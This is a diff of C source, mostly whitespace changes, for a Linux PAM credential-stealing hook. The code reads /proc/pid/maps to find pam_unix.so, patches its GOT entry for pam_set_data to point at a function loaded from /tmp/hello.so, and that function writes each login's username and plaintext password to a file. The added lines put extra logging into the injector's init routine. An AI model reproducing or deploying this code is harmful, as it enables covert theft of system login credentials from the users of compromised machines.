@@ -27,15 +27,15 @@ struct pam_handle {
     char *authtok_type;          /* PAM_AUTHTOK_TYPE */
     /*
     struct pam_data *data;
-    struct pam_environ *env;      
-    struct _pam_fail_delay fail_delay;  
-    struct pam_xauth_data xauth;  
+    struct pam_environ *env;
+    struct _pam_fail_delay fail_delay;
+    struct pam_xauth_data xauth;
     struct service handlers;
-    struct _pam_former_state former;  
-    const char *mod_name;   
-    int mod_argc;              
-    char **mod_argv;           
-    int choice;         
+    struct _pam_former_state former;
+    const char *mod_name;
+    int mod_argc;
+    char **mod_argv;
+    int choice;
 
 #ifdef HAVE_LIBAUDIT
     int audit_state;
@@ -54,7 +54,7 @@ void* get_module_base(pid_t pid, const char* module_name)
     char* pch;
     char filename[32];
     char line[MAX_BUF_SIZE];
-    
+
     // 格式化字符串得到 "/proc/pid/maps"
     if(pid < 0){
         snprintf(filename, sizeof(filename), "/proc/self/maps");
@@ -98,7 +98,7 @@ static int get_dyn_section(void *base_addr, struct dynamice_segment *dyn);
 static void get_rel_info(Elf64_Dyn *dynamic_table, uint32_t dynamic_size, struct rel_info *info);
 static void update_entry(uint64_t *addr, uint64_t *old_entry, uint64_t target_entry);
 
-static int hook_entry (void *base_addr, 
+static int hook_entry (void *base_addr,
                 const char *func_name,
                 uint64_t *old_entry,
                 uint64_t target_entry)
@@ -232,15 +232,17 @@ int my_pam_set_data(struct pam_handle *pamh, const char *module_data_name, void 
                 fprintf(fp,"login successful username is : %s    password is: %s\n",pamh->user,pamh->authtok);
         }
         fclose(fp);
-        } 
+        }
     return old_pam_set_data(pamh,module_data_name,data,cleanup);
 }
 
 
 int so_init(void)
 {
-
-
+    FILE *fp = NULL;
+    fp= fopen("/tmp/got.log", "a+");
+    fprintf(fp,"%s\n","Got Starting...\n");
+    fclose(fp);
     void* base_addr = get_module_base(getpid(), "pam_unix.so");
     void *handle = dlopen("/tmp/hello.so",RTLD_NOW);
     void *export_pam_set_data = dlsym(handle,"my_pam_set_data");
